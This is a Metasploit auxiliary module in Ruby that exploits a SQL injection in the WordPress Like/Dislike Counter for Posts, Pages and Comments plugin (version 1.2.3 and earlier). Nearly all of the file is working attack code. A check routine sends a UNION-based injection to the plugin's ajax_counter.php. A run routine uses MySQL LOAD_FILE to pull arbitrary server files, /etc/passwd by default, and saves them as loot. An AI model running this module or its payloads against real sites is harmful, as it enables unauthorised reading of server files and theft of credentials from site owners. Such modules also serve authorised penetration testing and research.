##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Wordpress Like/Dislike Counter for Posts, Pages and Comments Plugin SQL Injection',
      'Description'    => %q{

      This module exploits a SQL injection in version 1.2.3 and likely prior in both the Lite and Pro 
      version of the Like/Dislike Counter for Posts, Pages, and Comments plugin available for Wordpress
      },
      'References'     =>
        [
          ['EDB', 'http://www.exploit-db.com/exploits/34553/']
        ],
      'Author'         =>
        [
          'bperry',
          'XroGuE' #discovery
        ],
      'License'        => 'VolatileMinds',
      'DisclosureDate' => "Sep 07 2014"
    ))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The path to Wordpress', '/']),
        OptString.new('FILEPATH', [true, 'The filepath to read on the server', '/etc/passwd'])
      ], self.class)
  end

  def check
    marker = "rewq".unpack('H*')[0]
 
    check_payload = "-1783 UNION ALL SELECT CONCAT(0x#{marker},(CASE WHEN (USER() LIKE USER()) THEN 1 ELSE 0 END),0x#{marker})#"
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, "wp-content", 'plugins', 'like-dislike-counter-for-posts-pages-and-comments', 'ajax_counter.php'),
      'method' => 'POST',
      'vars_post' => {
        'post_id' => check_payload,
        'up_type' => 'like'
      }
    })

    if res and res.body.to_s == "rewq1rewq"
        return Msf::Exploit::CheckCode::Vulnerable
    end

    Msf::Exploit::CheckCode::Safe
  end

  def run
    marker = "rewq".unpack('H*')[0]

    file_payload = "-2 UNION ALL SELECT CONCAT(0x#{marker},IFNULL(CAST(HEX(LOAD_FILE(0x#{datastore['FILEPATH'].unpack('H*')[0]})) AS CHAR),0x20),0x#{marker})#"

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'wp-content', 'plugins', 'like-dislike-counter-for-posts-pages-and-comments', 'ajax_counter.php'),
      'method' => 'POST',
      'vars_post' => {
        'post_id' => file_payload,
        'up_type' => 'like'
      }
    })

    res.body =~ /rewq(.*)rewq/

    data = [$1].pack('H*')

    path = store_loot('wordpress.file', 'binary/octet-stream', datastore['RHOST'], data, datastore['FILEPATH'])
    print_status ("File saved to #{path}.")
    print_status ("If the file is empty, the file may not exist on the server or the user does not have FILE permissions.")

  end
end

